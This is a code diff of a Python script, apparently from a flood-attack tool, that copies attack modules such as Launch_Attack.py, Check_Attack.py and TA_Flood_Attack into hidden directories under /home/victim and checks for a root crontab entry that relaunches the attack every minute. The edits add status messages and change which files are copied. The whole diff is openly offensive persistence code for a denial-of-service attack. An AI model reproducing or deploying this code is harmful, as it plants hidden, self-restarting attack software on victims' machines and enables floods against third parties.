@@ -2,12 +2,15 @@ import os
 
 attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )\n'
+attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'
 
 
 def check_attack():
     if not is_set_up_attack():
+        print('Set up attack module...')
         set_up_attack()
+    else:
+        print('Already set up attack module.')
 
     if not is_set_up_crontab():
         print('Set up crontab...')
@@ -21,8 +24,7 @@ def set_up_attack():
     for attackDir in attackDirs:
         os.system('mkdir {0}'.format(attackDir))
         os.system('cp Launch_Attack.py {0}/Launch_Attack.py'.format(attackDir))
-        os.system('cp b.py {0}/Check_Attack.py'.format(attackDir))
-        os.system('cp Flood_Attack.py {0}/Flood_Attack.py'.format(attackDir))
+        os.system('cp Check_Attack.py {0}/Check_Attack.py'.format(attackDir))
         os.system('cp TA_Flood_Attack {0}/.module/'.format(attackDir))
 
     return
